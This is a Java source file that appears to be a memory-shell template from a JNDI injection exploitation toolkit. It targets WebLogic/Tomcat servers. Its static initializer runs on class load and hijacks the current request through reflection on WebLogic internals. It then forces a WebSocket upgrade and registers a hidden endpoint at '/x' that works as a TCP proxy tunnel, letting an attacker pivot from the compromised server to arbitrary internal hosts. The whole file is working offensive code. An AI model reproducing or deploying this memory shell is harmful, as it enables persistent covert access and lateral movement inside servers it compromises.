package com.qi4l.jndi.template.memshell.BypassNginxCDN;

import org.apache.catalina.connector.RequestFacade;
import org.apache.tomcat.util.codec.binary.Base64;
import org.apache.tomcat.util.security.ConcurrentMessageDigest;
import org.apache.tomcat.websocket.Constants;
import org.apache.tomcat.websocket.Transformation;
import org.apache.tomcat.websocket.WsHandshakeResponse;
import org.apache.tomcat.websocket.server.WsHandshakeRequest;
import org.apache.tomcat.websocket.server.WsHttpUpgradeHandler;
import org.apache.tomcat.websocket.server.WsServerContainer;
import weblogic.servlet.internal.HttpConnectionHandler;
import weblogic.servlet.internal.ServletRequestImpl;
import weblogic.servlet.internal.ServletResponseImpl;
import weblogic.servlet.provider.ContainerSupportProviderImpl;

import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.websocket.*;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.CompletionHandler;
import java.nio.charset.StandardCharsets;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

public class proxyMSBYNC extends Endpoint {

    static {
        try {
            Thread threadLocal = Thread.currentThread();
            Field  workEntry   = threadLocal.getClass().getDeclaredField("workEntry");
            workEntry.setAccessible(true);
            weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor wlsRequestExecutor = (ContainerSupportProviderImpl.WlsRequestExecutor) workEntry.get(threadLocal);
            Field                                                                     field1             = wlsRequestExecutor.getClass().getDeclaredField("connectionHandler");
            field1.setAccessible(true);
            weblogic.servlet.internal.HttpConnectionHandler connectionHandler = (HttpConnectionHandler) field1.get(wlsRequestExecutor);
            ServletRequestImpl                              request           = connectionHandler.getServletRequest();
            ServletResponseImpl                             response          = connectionHandler.getServletResponse();
            ServletContext                                  servletContext    = request.getSession().getServletContext();
            ServerEndpointConfig                            configEndpoint    = ServerEndpointConfig.Builder.create(proxyMSBYNC.class, "/x").build();
            WsServerContainer                               container         = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
            Map<String, String>                             pathParams        = Collections.emptyMap();


            response.setHeader(Constants.UPGRADE_HEADER_NAME, Constants.UPGRADE_HEADER_VALUE);
            response.setHeader(Constants.CONNECTION_HEADER_NAME, Constants.CONNECTION_HEADER_VALUE);
            response.setHeader(HandshakeResponse.SEC_WEBSOCKET_ACCEPT, getWebSocketAccept(request.getHeader("Sec-WebSocket-Key")));
            response.setStatus(101);
            WsHandshakeRequest  wsRequest  = new WsHandshakeRequest(request, pathParams);
            WsHandshakeResponse wsResponse = new WsHandshakeResponse();
            configEndpoint.getConfigurator().modifyHandshake(configEndpoint, wsRequest, wsResponse);
            try {
                List<Extension>      negotiatedExtensionsPhase2 = Collections.emptyList();
                Transformation       transformation             = null;
                String               subProtocol                = null;
                RequestFacade        requestFacade              = getRequestFacade(request);
                WsHttpUpgradeHandler wsHandler                  = requestFacade.upgrade(WsHttpUpgradeHandler.class);
                if (wsHandler != null) {
                    // Tomcat 8 preInit
                    wsHandler.preInit(configEndpoint, container, wsRequest, negotiatedExtensionsPhase2, subProtocol, transformation, pathParams, request.isSecure());
                    // Tomcat 7 preInit
                    // Endpoint ep = (Endpoint)configEndpoint.getConfigurator().getEndpointInstance(configEndpoint.getEndpointClass());
                    // wsHandler.preInit(ep, configEndpoint, container, wsRequest, negotiatedExtensionsPhase2, subProtocol, transformation, pathParams, request.isSecure());
                }
            } catch (Exception e) {
                System.out.println(e.toString());
            }
        } catch (Exception ignored) {
        }
    }

    long                                       i    = 0;
    ByteArrayOutputStream                      baos = new ByteArrayOutputStream();
    HashMap<String, AsynchronousSocketChannel> map  = new HashMap<String, AsynchronousSocketChannel>();

    private static RequestFacade getRequestFacade(HttpServletRequest request) {
        if (request instanceof RequestFacade) {
            return (RequestFacade) request;
        } else if (request instanceof HttpServletRequestWrapper) {
            HttpServletRequestWrapper wrapper        = (HttpServletRequestWrapper) request;
            HttpServletRequest        wrappedRequest = (HttpServletRequest) wrapper.getRequest();
            return getRequestFacade(wrappedRequest);
        } else {
            throw new IllegalArgumentException("Cannot convert [" + request.getClass() + "] to org.apache.catalina.connector.RequestFacade");
        }
    }

    private static String getWebSocketAccept(String key) {
        byte[] WS_ACCEPT = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11".getBytes(StandardCharsets.ISO_8859_1);
        byte[] digest    = ConcurrentMessageDigest.digestSHA1(key.getBytes(StandardCharsets.ISO_8859_1), WS_ACCEPT);
        return Base64.encodeBase64String(digest);
    }

    void readFromServer(Session channel, AsynchronousSocketChannel client) {
        final ByteBuffer buffer = ByteBuffer.allocate(50000);
        Attach           attach = new Attach();
        attach.client = client;
        attach.channel = channel;
        client.read(buffer, attach, new CompletionHandler<Integer, Attach>() {
            @Override
            public void completed(Integer result, final Attach scAttachment) {
                buffer.clear();
                try {
                    if (buffer.hasRemaining() && result >= 0) {
                        byte[]     arr = new byte[result];
                        ByteBuffer b   = buffer.get(arr, 0, result);
                        baos.write(arr, 0, result);
                        ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
                        if (scAttachment.channel.isOpen()) {
                            scAttachment.channel.getBasicRemote().sendBinary(q);
                        }
                        baos = new ByteArrayOutputStream();
                        readFromServer(scAttachment.channel, scAttachment.client);
                    } else {
                        if (result > 0) {
                            byte[]     arr = new byte[result];
                            ByteBuffer b   = buffer.get(arr, 0, result);
                            baos.write(arr, 0, result);
                            readFromServer(scAttachment.channel, scAttachment.client);
                        }
                    }
                } catch (Exception ignored) {
                }
            }

            @Override
            public void failed(Throwable t, Attach scAttachment) {
                t.printStackTrace();
            }
        });
    }

    void process(ByteBuffer z, Session channel) {
        try {
            if (i > 1) {
                AsynchronousSocketChannel client = map.get(channel.getId());
                client.write(z).get();
                z.flip();
                z.clear();
            } else if (i == 1) {
                String                    values      = new String(z.array());
                String[]                  array       = values.split(" ");
                String[]                  addrarray   = array[1].split(":");
                AsynchronousSocketChannel client      = AsynchronousSocketChannel.open();
                int                       po          = Integer.parseInt(addrarray[1]);
                InetSocketAddress         hostAddress = new InetSocketAddress(addrarray[0], po);
                Future<Void>              future      = client.connect(hostAddress);
                try {
                    future.get(10, TimeUnit.SECONDS);
                } catch (Exception ignored) {
                    channel.getBasicRemote().sendText("HTTP/1.1 503 Service Unavailable\r\n\r\n");
                    return;
                }
                map.put(channel.getId(), client);
                readFromServer(channel, client);
                channel.getBasicRemote().sendText("HTTP/1.1 200 Connection Established\r\n\r\n");
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void onOpen(final Session session, EndpointConfig config) {
        i = 0;
        session.setMaxBinaryMessageBufferSize(1024 * 1024 * 20);
        session.setMaxTextMessageBufferSize(1024 * 1024 * 20);
        session.addMessageHandler(new MessageHandler.Whole<ByteBuffer>() {
            @Override
            public void onMessage(ByteBuffer message) {
                try {
                    message.clear();
                    i++;
                    process(message, session);
                } catch (Exception ignored) {
                }
            }
        });
    }

    static class Attach {
        public AsynchronousSocketChannel client;
        public Session                   channel;
    }
}
